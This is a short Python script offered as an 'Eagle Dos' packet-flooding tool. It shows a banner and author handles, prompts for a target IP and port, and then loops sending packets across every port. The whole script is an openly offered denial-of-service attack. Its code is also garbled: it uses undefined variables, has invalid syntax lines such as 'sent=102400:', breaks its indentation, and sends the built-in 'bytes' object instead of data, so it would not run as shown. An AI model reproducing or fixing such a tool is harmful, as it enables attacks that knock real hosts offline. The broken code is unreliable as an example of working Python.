#Author WHITE L'
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM )
irandom = irandom._irandom(577)
Lbytes = Lbytes._irandom(104200)

os.system("clear")
print(" ")
print("                              $$\                       $ \                     ")
print("                              $$ |                      $$ |                    ")
print(" $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ ")
print("$$  __$$\  \____$$\ $$  __$$\ $$ |$$  __$$\       $$  __$$ |$$  __$$\ $$  _____|")
print("$$$$$$$$ | $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |      $$ /  $$ |$$ /  $$ |\$$$$$$\  ")
print("$$   ____|$$  __$$ |$$ |  $$ |$$ |$$   ____|      $$ |  $$ |$$ |  $$ | \____$$\ ")
print("\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\       \$$$$$$$ |\$$$$$$  |$$$$$$$  |")
print(" \_______| \_______| \____$$ |\__| \_______|       \_______| \______/ \_______/ ")
print("                    $$\   $$ |                                                  ")
print("                    \$$$$$$  |                                                  ")
print("                     \______/                                                   ")
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : ROCKY_EXTION" + N + "   Eagle Dos From - " + B + "" + R + "WH1T3" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : ROCKY-EXTION\033[0m")
print("\033[33mGithub 	       : https://github.com/ROCKY/\033[0m")
print("\033[33mTelegram       : https://t.me/ROCKY\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Enter The Target's IP : ")
port = input("[K] Enter the port target : ")
sent = input("[K] Enter the packrt sent : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for sent in range(10, 65534):
    	for port in range(10, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        sent=102400:
        port = port + 1
        port==102400:
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
        if Lbytes == 65534:
           Lbytes = 1

print("\033[1;92mAttack finished\033[0m")
